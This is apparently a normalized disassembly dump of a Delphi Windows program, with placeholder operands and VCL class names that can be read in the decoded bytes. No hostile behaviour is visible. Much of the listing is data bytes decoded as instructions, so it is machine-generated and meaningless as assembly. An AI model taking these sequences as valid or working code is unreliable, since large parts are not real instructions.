add [ esi + esi * 2 + 0x47 ] ah
add dl bh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_430989
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430990
retn
sub_43099c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4309cd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4309d4
retn
mov eax [ rw-data ]
call sub_403290
sub_430a84
or al [ eax ]
add [ eax ] al
adc [ edx + 0x47 ] bl
add [ eax + 0x61 ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 2 ] cl
inc edi
add [ eax ] ah
pushad
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] cl
pop edx
inc edi
add al cl
pop edi
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 2 ] al
inc edi
add [ eax + 0x47 ] bl
add [ eax ] al
add [ edx + 0x47 ] bl
add [ eax + 0x61 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add ah bh
pop ecx
inc edi
add [ eax + 0x4763 ] bl
add [ eax ] al
add al bh
pop ecx
inc edi
add [ eax + 0x4761 ] ch
add [ eax ] al
add ah dh
pop ecx
inc edi
add [ edx ] dh
inc edi
add [ eax ] al
add [ eax ] al
add al dh
pop ecx
inc edi
add [ eax + 0x63 ] bh
inc edi
add [ eax ] al
add [ eax ] al
add ah ch
pop ecx
inc edi
add al ch
pop edi
inc edi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_430b2c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430b33
retn
call sub_430a68
sub_430b60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430b85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430b8c
retn
sub_430ba7
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_430bec
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430bf3
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a84
sub_430c0f
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_430c54
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430c5b
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a84
sub_430c6b
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430cc1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430cc8
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_404008
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_430cd4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430d18
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430d1f
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_430d2c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430d51
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430d58
retn
sub_430d64
push 0x300430d
adc edx [ eax + ecx * 2 + 0x65 ]
popad
jb r-xdata
add [ eax ] al
add [ esi ] ah
push cs
inc ebx
add [ eax ] ch
add [ eax ] al
add [ esi + ebx * 2 + 0x41 ] cl
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push ebx
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebp + ecx + 0x43 ] ah
add [ esi ] al
push 0x78655473
je r-xdata
or [ ebx + 0x6f ] al
push 0x6e774f73
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
or al 0x0
insb
jae r-xdata
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
pushfd
mov [ ecx ] es
inc eax
jb r-xdata
outsb
je r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
cmp al 0xe
inc ebx
add [ edi ] al
push cs
push esp
dec eax
popad
jb r-xdata
push sub_430d51
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430d58
retn
shl ah 0xd
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx ] dl
inc ebx
add [ esi + ecx ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push cs
push esp
dec eax
popad
jb r-xdata
inc edx
inc ebx
add [ eax - 0x17ffbcbd ] dl
lea eax [ ecx ]
sbb [ esi - 0x71efffbf ] cl
inc ecx
add [ eax ] ch
inc edx
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0xc0040 ] dl
ja r-xdata
adc [ eax ] al
push ds
add [ eax ] al
[ esi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] eax
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
add [ eax ] eax
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
hlt
mov eax eax
hlt
insd
inc ebx
je r-xdata
inc ebx
outsd
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4c65646f
pop ecx
inc ebp
add [ eax ] ah
add [ eax ] al
jmp [ esp + eax * 2 + 0x10043 ]
insb
imul esp [ ebx + 0x6b ] r-xdata
pop ds
add [ eax ] al
inc esp
inc ebx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
or [ ecx + 0x75 ] al
je r-xdata
cmp al 0x10
inc eax
add [ eax + eax ] dl
add bh bh
or [ ebx + eax * 2 ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
add [ eax ] dl
inc eax
add [ 0x18ff0000 ] ah
inc ebx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop es
add [ esi ] cl
push eax
popad
jb r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
and al 0x0
add bh bh
cld
inc edx
inc ebx
add [ eax ] dl
inc ebx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080003 ] al
imul esp [ esp + esi * 2 + 0x68 ] 0x43103090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10 ] bl
inc ebx
add [ eax + 0x10 ] ah
inc ebx
add [ eax + eax ] bl
add [ eax ] al
add al 0x5f
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xchg esp eax
mov es [ ecx ]
outsb
je r-xdata
push esp
js r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6465646f
or eax 0x1d0043
add bh bh
and al 0x44
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add eax 0x6c797453
xchg esp eax
adc [ eax ] al
or al 0x0
add bh bh
xor al 0x44
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040009 ] al
add [ eax ] al
pop [ ecx ]
inc esp
xchg ebx eax
inc ecx
add [ eax - 0x6d ] cl
inc ecx
add [ ebx + edx * 4 + 0x41 ] cl
add [ ebx + edx * 4 ] bh
inc ecx
add [ eax * 2 - 0x7067ffbd ] bl
inc ecx
add [ eax + edx * 4 ] dl
inc ecx
add [ ecx ] al
add bh bh
[ eax ]
inc ebp
inc ebx
add [ edi ] cl
push esp
dec eax
popad
jb r-xdata
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
[ esp + eax * 2 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5705000a ] al
add [ eax + edx + 0x740c0043 ] bl
jae r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
outsb
je r-xdata
jb r-xdata
or [ ebx + 0x6f ] al
adc [ ebx ] al
pop es
andps xmm1 [ eax + 0x65 ]
popad
outsd
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
popad
arpl [ ebx + 0x42 ] bp
imul ebp [ gs : bp + 0xb ] 0x72547374
popad
pop es
insb
jae r-xdata
push esp
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
inc ebp
jns r-xdata
inc ebp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
adc [ ecx ] 0x43
add [ eax ] cl
sbb [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
outsd
outsb
je r-xdata
popad
or dh [ ebx + esi * 2 + 0x54 ]
jb r-xdata
jbe r-xdata
arpl [ ebx + 0x45 ] bp
outsb
dec esi
outsd
je r-xdata
outsd
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jb r-xdata
shl ah 0x10
inc ebx
add [ eax ] cl
pop ss
push esp
inc ebx
jne r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
arpl [ ebx + 0x4d ] bp
outsd
jbe r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
adc [ ebx ] al
mov al 0x5f
inc ecx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
je r-xdata
outsb
je r-xdata
inc ebx
add [ eax ] bh
push cs
jbe r-xdata
outsb
jb r-xdata
insd
dec eax
popad
jb r-xdata
outsd
insb
or [ edi ] al
je r-xdata
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
adc al [ edx + edx * 2 ]
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x7 ] si
jb r-xdata
insd
inc ebx
je r-xdata
arpl [ ebx + 0x45 ] bp
outsb
or [ fs : ebx + 0x6f ] al
inc ebx
cmp [ esi ] cl
je r-xdata
inc ebp
jbe r-xdata
insb
jae r-xdata
je r-xdata
je r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
imul edx [ ebx + 0x74 ] 0x61
outsd
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
add cl [ eax ]
or eax 0x64616548
sbb [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
outsd
outsb
je r-xdata
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
jae r-xdata
inc ebx
add [ eax ] bh
push cs
insd
inc esp
jb r-xdata
outsb
je r-xdata
add [ ebx + 0x4310a0c0 ] cl
add [ ebx ] al
adc dl [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
jne r-xdata
outsd
dec eax
popad
jb r-xdata
add [ edx + 0xe380043 ] dh
inc ebx
add [ eax + edx ] bh
inc eax
add [ eax + edx - 0x3f74ffbd ] bl
adc [ edx ] 0x43
add [ eax ] cl
adc [ ebx + edx * 2 + 0x65 ] edx
arpl [ ecx + ebp * 2 + 0x6f ] si
add eax 0x74617453
adc dl [ gs : ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
outsd
outsb
je r-xdata
imul ebp [ edi + 0x6e ] 0x63617254
popad
jb r-xdata
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
add [ ebx + 0x4311e8c0 ] cl
add [ eax ] cl
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ edx + 0xe380043 ] dh
jb r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add [ edx + 0xe380043 ] dh
ja r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
arpl [ ebx + 0x53 ] bp
je r-xdata
jae r-xdata
je r-xdata
or [ esi ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx ] ecx
inc ecx
insb
insb
outsd
ja r-xdata
add [ ecx + edx ] al
inc eax
add [ eax ] bh
push cs
inc ebx
inc ebp
jbe r-xdata
outsb
push cs
push esp
push esp
outsd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
arpl [ ebx + 0x53 ] bp
outsb
inc esp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
outsd
outsb
je r-xdata
je r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ 0x74646957 ] al
push 0x746e4907
jb r-xdata
push eax
jb r-xdata
arpl [ eax + eax + 0x7 ] si
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
outsd
popad
jb r-xdata
je r-xdata
insd
dec eax
popad
jb r-xdata
inc eax
add al bh
jb r-xdata
add [ ebx + edx * 2 ] ecx
push esp
inc ebx
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jns r-xdata
outsd
insd
dec eax
add [ eax ] bh
push cs
inc ebx
add [ eax ] al
adc [ eax ] al
nop
add al 0x13
inc ebx
add [ eax ] cl
and [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
outsb
je r-xdata
jb r-xdata
je r-xdata
outsb
jb r-xdata
insd
dec eax
popad
jb r-xdata
add [ eax ] eax
add [ eax ] eax
outsd
outsb
je r-xdata
pushfd
add [ eax ] al
int3
adc edx [ eax + ecx * 2 + 0x65 ]
popad
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
or al 0x53
pop es
inc edx
outsd
outsd
insb
popad
outsb
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
xor al [ eax ]
inc esp
xor al [ eax ]
push 0xf4004346
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x13 ] dh
add [ gs : eax ] eax
dec eax
popad
popad
je r-xdata
add al 0x8
push es
push ebx
insd
dec eax
or [ ebx ] cl
inc esi
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xb ] si
outsd
outsb
je r-xdata
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
inc esp
add [ eax - 0x2fffbcac ] ah
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
adc eax 0x43
outsd
insb
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add al al
inc esi
inc ebx
add [ esp + eax * 8 + 0x44 ] ah
add ah ch
inc edi
inc ebx
add [ eax + ecx * 8 ] dl
inc esp
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
add al [ eax ]
add al al
dec ebx
inc esp
add [ esi + ecx + 0x34cc0042 ] al
inc eax
je r-xdata
jb r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
imul ebp [ edi + 0x6e ] 0x73616c43
jae r-xdata
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
push cs
push esp
dec eax
popad
jb r-xdata
outsd
insb
or [ ebx + 0x6f ] al
push 0x616c4673
je r-xdata
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x54 ] 0x48
inc ebx
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ eax + 0x57 ] ch
inc ebx
add [ eax - 0x2bffbca9 ] ah
push esp
inc ebx
add [ 0x2bb03c00 ] cl
mov esp 0x201bc4e
add eax 0xb3004700
push [ edx - 0x4f004e01 ]
[ edi - 0x49005101 ]
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax - 0x44 ]
push ecx
inc ebx
add [ eax ] dh
scasb [ edi ]
inc esp
add [ eax ] dl
int1
inc esp
add ah cl
int1
inc esp
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
inc edx
add ah cl
xor al 0x40
add [ edx + 0x43 ] dh
add [ eax ] al
je r-xdata
std
inc esp
add [ esi + eax * 8 ] bl
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x5fffbb55 ] dh
push esp
insb
je r-xdata
inc ebp
jbe r-xdata
inc ebx
inc ebx
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or [ ecx ] cl
or eax [ edx ]
jl r-xdata
insb
adc eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ 0x43 ] dl
lea eax [ eax ]
clc
insd
inc ebx
je r-xdata
inc ebx
outsd
add [ eax ] al
add [ eax ] eax
inc ebx
add [ ebx ] al
or al 0x54
inc ebx
add al dl
outsd
add [ eax ] al
jo r-xdata
outsb
je r-xdata
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
inc edx
add [ esi + ecx + 0x45980042 ] ah
inc ebx
add [ eax ] cl
inc ebx
add [ ecx ] cl
push 0x74754273
je r-xdata
sub_4327d4
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
pop ebp
inc ebx
jb r-xdata
inc ebx
add al ch
lea eax [ ecx ]
sbb [ esi - 0x71efffbf ] cl
inc ecx
add [ esp + ebx * 2 + 0x43 ] ch
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x340040 ] dl
add [ eax ] al
add al [ eax ]
std
pop esi
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
add [ eax ] al
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ fs : ebx ] al
xchg esp eax
sub [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
inc esp
sub [ ebx ] al
inc eax
add [ eax ] ah
add al dh
mov [ ecx ] eax
clc
mov [ ecx ] eax
rcr [ ebp + 0x43 ] 0x0
test al 0x5e
inc ebx
add [ eax + ebp + r-xdata ] al
add [ eax ] al
dec esp
pop esi
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
and [ ebp + 0x43 ] bl
sub_43287c
cld
pop esi
inc ebx
add [ edi + ebx * 2 ] bl
inc ebx
add [ ecx ] cl
push esp
inc ebx
outsd
outsd
insb
inc edx
popad
outsb
mov eax eax
xchg esp eax
sub [ ebx ] al
pop es
or [ ebx + eax * 2 + 0x6f ] edx
outsd
insb
inc edx
popad
outsb
inc esp
sub [ ebx ] al
fcomp [ esi + 0x41 ]
add [ eax ] dl
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
inc [ eax + 0x43 ]
insb
jae r-xdata
add [ eax ] al
inc [ eax ]
pushad
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] cl
dec eax
outsd
jb r-xdata
dec edi
inc esp
add [ eax ] ch
add [ eax ] al
[ eax + 0x60 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060000 ] al
imul esi [ ebp + ebp * 2 + 0x61 ] 0x45db4870
add [ eax + eax ] cl
add bh bh
test [ edi + 0x43 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax + 0x30004228 ] bh
add [ eax ] al
[ eax + 0x5f ]
add [ eax ] al
or al [ eax ]
or [ ebp + 0x69 ] cl
outsb
jpe r-xdata
je r-xdata
outsd
insb
add [ eax ] dl
inc eax
add [ eax ] bl
add [ eax ] al
push [ eax ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax 0x69460f00
outsb
je r-xdata
jb r-xdata
push cs
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
cmp [ eax ] al
add bh bh
sbb al 0x61
outsb
je r-xdata
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sub al 0x0
outsb
add [ eax ] 0x0
insb
dec edi
outsb
insb
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a0008 ] al
insd
popad
dec ecx
inc edx
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070004 ] al
outsd
je r-xdata
or eax 0x65540400
js r-xdata
outsd
insb
outsd
jb r-xdata
and [ eax ] al
add bh bh
fcomp [ edi + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ecx
inc ebp
add [ eax + eax ] dl
add bh bh
and al 0x60
inc ebx
add [ ecx ] al
add bh bh
in al dx
pushad
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
add [ eax ] dl
inc eax
add [ eax + eax ] ch
adc [ eax ] al
sbb al 0x0
add bh bh
int3
outsb
js r-xdata
dec ecx
jne r-xdata
js r-xdata
add [ eax ] al
add [ 0x69460f00 ] al
add ah ah
pushad
inc ebx
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add bh bh
add eax [ eax ]
add eax 0x6f6c6f43
jb r-xdata
insb
add [ gs : eax ] dl
inc eax
add [ 0xffffffff94ff0000 ] cl
pop edi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x61657242
imul esp [ eax + 0x1d ] 0x42
add [ eax + eax ] ah
add bh bh
inc esp
pushad
inc ebx
int3
add [ eax ] dl
inc eax
add ah cl
pop esi
inc ebx
add al dh
pop edi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
sub eax 0x4ff0000
popad
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
or al 0x50
popad
jb r-xdata
dec ecx
add [ fs : eax ] dl
inc eax
add [ esi ] cl
add [ eax ] al
jmp [ edi + ebx * 2 + 0x10043 ]
imul esp [ esp + esi * 2 + 0x68 ] 0x2b3cc08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp + 0x43 ] ah
add [ ebx + ebp + 0x43 ] ch
add [ eax ] ah
add [ eax ] al
add [ edi + ebx * 2 ] al
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xchg esp eax
mov es [ ecx ]
outsb
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5705000f ] al
imul esp [ edx + 0x6c ] 0x40103c65
add [ eax ] bh
add [ eax ] al
[ ecx ]
imul esi [ ebp + ebp * 2 + 0x61 ] 0x40109470
add [ eax + eax ] dh
add bh bh
mov esp 0x1004360
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404000d ] al
js r-xdata
sub_43381a
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add [ eax ] dl
int1
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ eax - 0x3f ] ch
inc esp
add [ esp + eax * 8 + 0x44 ] ah
add [ eax - 0x7c ] al
inc ebx
add [ eax + ecx * 8 ] dl
inc esp
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ eax ] ch
add [ ebx ] 0x2c
add [ ebx ] 0xffffffcc
sub al [ eax ]
fadd [ ebx + eax * 2 + 0x402acc00 ]
add ah cl
sub al [ eax ]
int3
sub_4338c8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ecx ] bh
inc ebx
add [ eax + eax ] cl
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
inc ebx
popad
insb
inc ebp
jb r-xdata
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
add [ esi + ecx - 0x733fffbe ] ah
inc ebx
add [ eax ] cl
stc
inc esp
add [ edi + ecx * 4 - 0x71afffbd ] dh
inc ebx
add [ eax ] bh
jle r-xdata
add [ ebx + ecx + 0x42 ] bh
outsd
jb r-xdata
add eax [ eax ]
inc ebx
popad
insb
outsb
popad
jb r-xdata
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ eax ] ch
add [ ebx ] 0x2c
add [ ebx ] 0x4
pop [ ebx ]
fadd [ ebx + eax * 2 + 0x438f0c00 ]
